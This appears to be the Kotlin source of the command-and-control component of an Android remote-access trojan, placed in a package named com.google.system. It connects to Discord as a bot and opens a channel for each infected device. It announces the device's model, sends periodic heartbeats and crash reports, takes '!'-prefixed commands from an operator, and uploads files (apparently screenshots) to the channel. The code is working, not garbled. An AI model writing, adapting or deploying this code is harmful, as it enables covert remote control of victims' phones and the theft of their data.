package com.google.system

import android.util.Log
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.UUID
import java.util.concurrent.TimeUnit

class DiscordGatewayClient(
    private val onCommand: (action: String, payload: String?) -> Unit
) {
    companion object {
        private const val TAG = "DiscordGW"
        private const val OP_DISPATCH = 0
        private const val OP_HELLO = 10
        private const val OP_HEARTBEAT = 1
        private const val OP_IDENTIFY = 2
        private const val OP_RESUME = 6
        private const val OP_RECONNECT = 7
        private const val OP_INVALID_SESSION = 9
        private const val OP_HEARTBEAT_ACK = 11
        private const val DEVICE_HB_INTERVAL = 300000L
    }

    private val client = OkHttpClient.Builder()
        .readTimeout(0, TimeUnit.SECONDS)
        .writeTimeout(0, TimeUnit.SECONDS)
        .connectTimeout(15, TimeUnit.SECONDS)
        .pingInterval(30, TimeUnit.SECONDS)
        .build()

    private val jsonMedia = "application/json".toMediaType()

    private var ws: WebSocket? = null
    private var scope: CoroutineScope? = null
    private var heartbeatJob: Job? = null
    private var deviceHeartbeatJob: Job? = null
    private var reconnectJob: Job? = null
    private var heartbeatInterval = 41250L
    private var seq: Int? = null
    private var sessionId: String? = null
    private var guildId: String? = null
    private var myChannelId: String? = null
    private var deviceSuffix: String = UUID.randomUUID().toString().take(6)
    private var reconnectAttempt = 0
    private var resuming = false
    private var closing = false
    private var connectVersion = 0L
    private var crashReport: String? = null
    private var channelCreateRetries = 0

    private val httpClient = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    fun setCrashReport(report: String) {
        crashReport = report
    }

    fun start(coroutineScope: CoroutineScope) {
        closing = false
        scope = coroutineScope
        connect()
    }

    fun stop() {
        closing = true
        heartbeatJob?.cancel()
        deviceHeartbeatJob?.cancel()
        reconnectJob?.cancel()
        ws?.close(1000, "shutdown")
        ws = null
        scope = null
    }

    private fun connect() {
        if (closing) return
        connectVersion++
        val myVersion = connectVersion
        ws?.close(1000, "reconnecting")
        ws = null
        val req = Request.Builder().url(DiscordConfig.GATEWAY_URL).build()
        ws = client.newWebSocket(req, object : WebSocketListener() {
            override fun onOpen(ws: WebSocket, response: Response) {
                Log.i(TAG, "Gateway connected")
            }

            override fun onMessage(ws: WebSocket, text: String) {
                handleMessage(text)
            }

            override fun onClosing(ws: WebSocket, code: Int, reason: String) {
                if (!closing) scheduleReconnect()
            }

            override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                if (!closing) scheduleReconnect()
            }

            override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "Gateway failure: ${t.message}")
                if (!closing) scheduleReconnect()
            }
        })
    }

    private fun handleMessage(text: String) {
        try {
            val msg = JSONObject(text)
            val op = msg.optInt("op", -1)
            val d = msg.opt("d")
            val s = msg.optInt("s", -1)
            if (s > 0) seq = s

            when (op) {
                OP_HELLO -> {
                    val hello = d as JSONObject
                    heartbeatInterval = hello.optLong("heartbeat_interval", 41250)
                    reconnectAttempt = 0
                    reconnectJob?.cancel()

                    if (resuming && sessionId != null) {
                        resuming = false
                        resume()
                    } else {
                        resuming = false
                        sessionId = null
                        identify()
                    }
                    startHeartbeat()
                }
                OP_DISPATCH -> handleDispatch(msg.optString("t", ""), d)
                OP_HEARTBEAT_ACK -> { /* all good */ }
                OP_RECONNECT -> {
                    Log.w(TAG, "Reconnect requested via OP 7")
                    resuming = sessionId != null
                    scheduleReconnect()
                }
                OP_INVALID_SESSION -> {
                    val canResume = d as? Boolean ?: false
                    Log.w(TAG, "Invalid session, resume=$canResume, sessionId=${sessionId != null}")
                    resuming = canResume && sessionId != null
                    if (!canResume) sessionId = null
                    scheduleReconnect()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "handleMessage: ${e.message}")
        }
    }

    private fun handleDispatch(type: String, d: Any?) {
        when (type) {
            "READY" -> {
                val data = d as JSONObject
                sessionId = data.optString("session_id", null)
                val user = data.optJSONObject("user")
                Log.i(TAG, "READY — bot: ${user?.optString("username")}#${user?.optString("discriminator")} guilds: ${data.optJSONArray("guilds")?.length()}")
            }
            "RESUMED" -> {
                Log.i(TAG, "Session resumed successfully")
                startHeartbeat()
                if (myChannelId == null) {
                    Log.w(TAG, "No channel after resume, fetching via REST...")
                    scope?.launch(Dispatchers.IO) { findOrCreateChannelViaRest() }
                }
            }
            "GUILD_CREATE" -> {
                val data = d as JSONObject
                if (guildId == null) {
                    guildId = data.optString("id", null)
                    Log.i(TAG, "Guild ID: $guildId")
                }
                if (guildId != null && myChannelId == null) {
                    findOrCreateChannel(data.optJSONArray("channels"))
                }
            }
            "MESSAGE_CREATE" -> {
                val data = d as JSONObject
                val channelId = data.optString("channel_id", "")
                if (channelId == myChannelId) {
                    val content = data.optString("content", "").trim()
                    if (content.startsWith("!")) {
                        val parts = content.substring(1).split(" ", limit = 2)
                        val action = parts[0].lowercase()
                        val payload = parts.getOrNull(1)
                        onCommand(action, payload)
                    }
                }
            }
        }
    }

    private fun findOrCreateChannel(channelsArray: JSONArray?) {
        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
        if (channelsArray != null) {
            for (i in 0 until channelsArray.length()) {
                val ch = channelsArray.getJSONObject(i)
                if (ch.optString("name", "") == prefix) {
                    myChannelId = ch.optString("id", null)
                    Log.i(TAG, "Found existing channel: $myChannelId")
                    sendOnlineMsg()
                    return
                }
            }
        }
        createChannel(prefix)
    }

    private suspend fun findOrCreateChannelViaRest() {
        val gId = guildId ?: run {
            Log.w(TAG, "findOrCreateChannelViaRest: no guildId")
            return
        }
        try {
            val url = "https://discord.com/api/v10/guilds/$gId/channels"
            val req = Request.Builder()
                .url(url)
                .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                .build()
            val resp = httpClient.newCall(req).execute()
            resp.use { r ->
                if (r.isSuccessful) {
                    val body = r.body?.string()
                    if (body != null) {
                        val channels = JSONArray(body)
                        val prefix = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
                        for (i in 0 until channels.length()) {
                            val ch = channels.getJSONObject(i)
                            if (ch.optString("name", "") == prefix) {
                                myChannelId = ch.optString("id", null)
                                Log.i(TAG, "Found channel via REST: $myChannelId")
                                sendOnlineMsg()
                                return
                            }
                        }
                        Log.i(TAG, "Channel not found via REST, creating...")
                        createChannel(prefix)
                    } else {
                        Log.w(TAG, "findOrCreateChannelViaRest: empty body")
                    }
                } else {
                    val errBody = r.body?.string()
                    Log.e(TAG, "List channels failed: HTTP ${r.code} body=$errBody")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "findOrCreateChannelViaRest: ${e.message}")
        }
    }

    private fun createChannel(name: String) {
        scope?.launch(Dispatchers.IO) {
            var attempt = 0
            val maxAttempts = 4
            while (attempt < maxAttempts && myChannelId == null && !closing) {
                try {
                    val gId = guildId ?: return@launch
                    val json = JSONObject().apply {
                        put("name", name)
                        put("type", 0)
                    }
                    val url = "https://discord.com/api/v10/guilds/$gId/channels"
                    val req = Request.Builder()
                        .url(url)
                        .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                        .header("Content-Type", "application/json")
                        .post(json.toString().toRequestBody(jsonMedia))
                        .build()
                    val resp = executeWithRetry(req)
                    resp.use { r ->
                        if (r.isSuccessful) {
                            val body = r.body?.string()
                            if (body != null) {
                                val ch = JSONObject(body)
                                myChannelId = ch.optString("id", null)
                                Log.i(TAG, "Created channel (attempt $attempt): $myChannelId")
                                sendOnlineMsg()
                            } else {
                                Log.w(TAG, "Create channel attempt $attempt: empty body")
                            }
                        } else {
                            val errBody = r.body?.string()
                            Log.e(TAG, "Create channel failed (attempt $attempt): HTTP ${r.code} body=$errBody")
                        }
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "createChannel attempt $attempt: ${e.message}")
                }
                if (myChannelId == null && attempt < maxAttempts - 1) {
                    val delay = (1000L shl attempt).coerceAtMost(15000L)
                    Log.i(TAG, "Retrying channel creation in ${delay}ms...")
                    delay(delay)
                }
                attempt++
            }
            if (myChannelId == null) {
                Log.e(TAG, "Failed to create channel after $maxAttempts attempts")
            }
        }
    }

    fun sendOnlineMsg() {
        scope?.launch(Dispatchers.IO) {
            sendMsg(":green_circle: **Device Online** — ${android.os.Build.MODEL} (${android.os.Build.VERSION.RELEASE})")
            crashReport?.let { report ->
                delay(500)
                sendMsg(":warning: **Crash Report**\n```\n${report.take(1900)}\n```")
                crashReport = null
            }
            startDeviceHeartbeat()
        }
    }

    fun sendMsg(text: String) {
        val chId = myChannelId ?: run {
            Log.w(TAG, "sendMsg: no channel")
            return
        }
        scope?.launch(Dispatchers.IO) {
            try {
                val json = JSONObject().put("content", text)
                val url = "https://discord.com/api/v10/channels/$chId/messages"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .header("Content-Type", "application/json")
                    .post(json.toString().toRequestBody(jsonMedia))
                    .build()
                val resp = executeWithRetry(req)
                resp.use { r ->
                    if (!r.isSuccessful) {
                        val errBody = r.body?.string()
                        Log.e(TAG, "sendMsg failed: HTTP ${r.code} body=$errBody")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "sendMsg: ${e.message}")
            }
        }
    }

    fun sendFile(text: String, fileName: String, fileBytes: ByteArray) {
        val chId = myChannelId ?: return
        scope?.launch(Dispatchers.IO) {
            try {
                val payloadJson = JSONObject().put("content", text)
                val body = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("payload_json", null, payloadJson.toString().toRequestBody(jsonMedia))
                    .addFormDataPart("file", fileName, fileBytes.toRequestBody("image/png".toMediaType()))
                    .build()
                val url = "https://discord.com/api/v10/channels/$chId/messages"
                val req = Request.Builder()
                    .url(url)
                    .header("Authorization", "Bot ${DiscordConfig.BOT_TOKEN}")
                    .post(body)
                    .build()
                executeWithRetry(req).use { }
            } catch (e: Exception) {
                Log.e(TAG, "sendFile: ${e.message}")
            }
        }
    }

    private fun identify() {
        val identify = JSONObject().apply {
            put("op", OP_IDENTIFY)
            put("d", JSONObject().apply {
                put("token", DiscordConfig.BOT_TOKEN)
                put("intents", DiscordConfig.INTENTS)
                put("properties", JSONObject().apply {
                    put("os", "android")
                    put("browser", "okhttp")
                    put("device", "phantom")
                })
            })
        }
        ws?.send(identify.toString())
        Log.i(TAG, "Sent identify")
    }

    private fun resume() {
        val sid = sessionId ?: run { Log.w(TAG, "No session to resume"); return }
        Log.i(TAG, "Attempting session resume (seq=$seq)")
        val payload = JSONObject().apply {
            put("op", OP_RESUME)
            put("d", JSONObject().apply {
                put("token", DiscordConfig.BOT_TOKEN)
                put("session_id", sid)
                put("seq", seq ?: JSONObject.NULL)
            })
        }
        ws?.send(payload.toString())
    }

    private fun startHeartbeat() {
        heartbeatJob?.cancel()
        heartbeatJob = scope?.launch {
            while (isActive) {
                val payload = JSONObject().apply {
                    put("op", OP_HEARTBEAT)
                    put("d", seq ?: JSONObject.NULL)
                }
                ws?.send(payload.toString())
                delay(heartbeatInterval)
            }
        }
    }

    private fun startDeviceHeartbeat() {
        deviceHeartbeatJob?.cancel()
        deviceHeartbeatJob = scope?.launch {
            delay(DEVICE_HB_INTERVAL)
            while (isActive) {
                sendMsg(":heartbeat: **Alive** — ${android.os.Build.MODEL}")
                delay(DEVICE_HB_INTERVAL)
            }
        }
    }

    private fun scheduleReconnect() {
        reconnectJob?.cancel()
        val scheduleVersion = connectVersion
        reconnectJob = scope?.launch {
            if (closing) return@launch
            val delay = (DiscordConfig.RECONNECT_BASE_DELAY * (1 shl reconnectAttempt))
                .coerceAtMost(DiscordConfig.MAX_RECONNECT_DELAY)
            reconnectAttempt++
            Log.i(TAG, "Reconnecting in ${delay}ms (attempt ${reconnectAttempt})...")
            delay(delay)
            if (!closing && connectVersion == scheduleVersion) connect()
        }
    }

    private fun executeWithRetry(request: Request): Response {
        var retries = 0
        while (retries < 3) {
            val resp = httpClient.newCall(request).execute()
            if (resp.code == 429) {
                val retryAfter = resp.header("Retry-After")?.toFloatOrNull()?.toLong() ?: 5L
                Log.w(TAG, "Rate limited, retrying after ${retryAfter}s")
                resp.close()
                Thread.sleep(retryAfter * 1000)
                retries++
                continue
            }
            return resp
        }
        return httpClient.newCall(request).execute()
    }

    fun getChannelId(): String? = myChannelId
    fun getDeviceTag(): String = "${DiscordConfig.CHANNEL_PREFIX}${deviceSuffix}"
}
